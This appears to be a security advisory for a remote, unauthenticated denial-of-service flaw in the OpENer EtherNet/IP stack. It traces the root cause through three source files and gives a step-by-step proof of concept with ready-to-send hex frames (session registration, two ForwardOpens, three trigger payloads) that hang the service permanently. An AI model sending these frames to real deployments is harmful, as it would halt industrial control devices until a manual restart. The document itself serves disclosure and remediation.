## Title: Unrecoverable Denial of Service Vulnerability in OpENer v2.1.0 – v2.3 (and current master)

**BUG_Author:** wtm2648 (with Chauncy) — both are GitHub usernames

**Affected Version:** OpENer v2.1.0 through v2.3 (last official release, 2019-03-25) and the development line through current master (commit `fb90c99`, 2026-11-09). Introduced by commit `5da61f7` (2018-01-26 16:55, "Fixes timeout behavior for Class3 connections") — verified by bisection: its parent commit `04731d7` does not wedge under the same trigger, `5da61f7` itself does. Dynamically reproduced on v2.1.0 (first release carrying the fault, all three trigger paths) and on current master; v2.2.0, v2.2.1 and v2.3 contain the identical faulty code (verified by source inspection), and no commit between 2018-01-26 and current master ever modified the three faulty functions. The only earlier release, v1.2.0 (2012), predates the faulty code and is not affected.

**Vendor:** [EIPStackGroup/OpENer GitHub Repository](https://github.com/EIPStackGroup/OpENer)

**Software:** [OpENer](https://github.com/EIPStackGroup/OpENer) — open-source EtherNet/IP adapter protocol stack (ENIP/CIP reference implementation, TCP/UDP 44818)

**Vulnerability Files:**
- `source/src/enet_encap/encap.c`
- `source/src/ports/generic_networkhandler.c`
- `source/src/ports/socket_timer.c`

## Description:

1. **Denial of Service via Class 3 connection timeout on an already-freed session slot:**
   - OpENer removes an encapsulation session while Class 3 (explicit) connections bound to it are still alive: `CloseClass3ConnectionBasedOnSession()` in `encap.c` walks the active connection list and closes matching connections *while iterating* it. The close callback unlinks and zeroes the current list node, so `node->next` reads NULL and the traversal stops after the first match — **every remaining Class 3 connection on that session is skipped and stays active with a dangling session reference**.
   - When such a leaked connection's timeout fires (~8–15 s), `Class3ConnectionTimeoutHandler()` calls `CloseSessionBySessionHandle()`, which reads `g_registered_sessions[handle - 1]` **without any range or liveness validation**. The slot is already free (`kEipInvalidSocket == -1`), so `CloseTcpSocket(-1)` is called.
   - `RemoveSocketTimerFromList(-1)` then runs a cleanup loop that linearly searches the timer array for the value -1 — but **every empty timer slot stores exactly -1 by design**, and clearing a slot writes -1 back. The loop always finds an "empty" slot and can never terminate (**CWE-835**).

2. **Exploiting the Denial of Service:**
   - Any remote, unauthenticated peer that can reach TCP 44818 opens two Class 3 (explicit) connections via ForwardOpen in one session, then removes the session. The wedge follows within one connection-timeout period. Three confirmed trigger paths:
     1. a SendUnitData whose encapsulation header declares a payload length of 100 but carries only 30 bytes (the server discards it as a fragmented packet and its error handling removes the session);
     2. a fully legal, spec-conformant **UnregisterSession** command — no malformed traffic at all;
     3. a completely well-formed message that merely arrives split across two TCP writes — no malformed bytes at all.

3. **Impact:**
   - OpENer handles all EtherNet/IP traffic (explicit messaging, implicit I/O, device discovery via UDP ListIdentity) from a single thread, so this one infinite loop takes down the **entire service**: ~100% CPU userspace spin (process state `R`), no response to any traffic, and **no self-recovery — only an external process restart restores the service**. The impact is availability-only (no confidentiality/integrity impact), but permanent and repeatable: one ~250-byte exchange per wedged state.

4. **Verifying the Exploit:**
   - About 8–15 seconds after the client disconnects, the OpENer process pins one CPU core at ~100% (process state `R`), stops answering new and existing TCP sessions, and stops answering UDP ListIdentity probes. No crash occurs; the condition persists forever until the process is restarted.

## Proof of Concept:

1. Build unmodified upstream master (`fb90c99`) for POSIX (CMake RelWithDebInfo) and start it on a network interface (listening on TCP/UDP 44818).
2. From another host, open a TCP connection to port 44818 and send the setup frames one by one, waiting for each reply (both ForwardOpens succeed; the server assigns session handle 1, which the following frames reference):
   ```
   REGISTER (0x0065)          65000400000000000000000052454749535452300000000001000000
   ForwardOpen #1 (0x006F)    6f003e0001000000000000004657444f50454e3000000000000000000000020000000000b2002e00540220062401050a4433221100000000222201008877665503000000a08601000042a08601000042830220022401
   ForwardOpen #2 (0x006F)    6f003e0001000000000000004657444f50454e3000000000000000000000020000000000b2002e00540220062401050a4433221100000000333301008877665503000000a08601000042a08601000042830220022401
   ```
3. Send **one** of the three trigger payloads, then close the TCP connection:
   - **Path 1 — malformed declared length** (SendUnitData header declares Length=100, body carries 30 bytes):
     ```
     700064000100000000000000554e495444415441000000000000000000000200a100040015000000b1000a0001000e03200124013001
     ```
   - **Path 2 — fully legal UnregisterSession**:
     ```
     660000000100000000000000554e52454749535400000000
     ```
   - **Path 3 — fully well-formed SendUnitData** (declared 30 == actual 30, no invalid field), sent as two TCP writes: the first 24 bytes (encapsulation header), then the remaining 30 bytes about 1 s later:
     ```
     70001e000100000000000000554e495444415441000000000000000000000200a100040015000000b1000a0001000e03200124013001
     ```
4. Wait ~15 seconds. The server enters the infinite loop: ~100% CPU, state `R`, no responses on any port.
5. Attach gdb to the spinning process (`gdb -p $(pidof OpENer) -batch -ex "thread apply all bt"`); the backtrace shows the loop:
   ```
   #0 SocketTimerArrayGetSocketTimer(..., socket=-1) / SocketTimerClear   socket_timer.c
   #1 RemoveSocketTimerFromList (socket_handle=-1)                        generic_networkhandler.c
   #2 CloseTcpSocket (socket_handle=-1)                                   generic_networkhandler.c
   #3 CloseSessionBySessionHandle                                         encap.c
   #4 Class3ConnectionTimeoutHandler                                      cipclass3connection.c
   #5 ManageConnections                                                   cipconnectionmanager.c
   ```
6. Only killing/restarting the process restores service (verified: after restart, UDP ListIdentity answers again; re-running the sequence re-wedges it deterministically).

**References:**
- Upstream report: [EIPStackGroup/OpENer issue #621](https://github.com/EIPStackGroup/OpENer/issues/621) (includes GDB evidence and a hardware-watchpoint trace of the full defect chain)
- Full reproduction package (Docker environment, automated scripts for all three trigger paths, captured evidence): [opener-wedge-repro.tar.gz](https://github.com/wtm2648/report_repository/blob/main/reports/2026-11/opener/class3-timeout-wedge/reproduce/opener-wedge-repro.tar.gz)
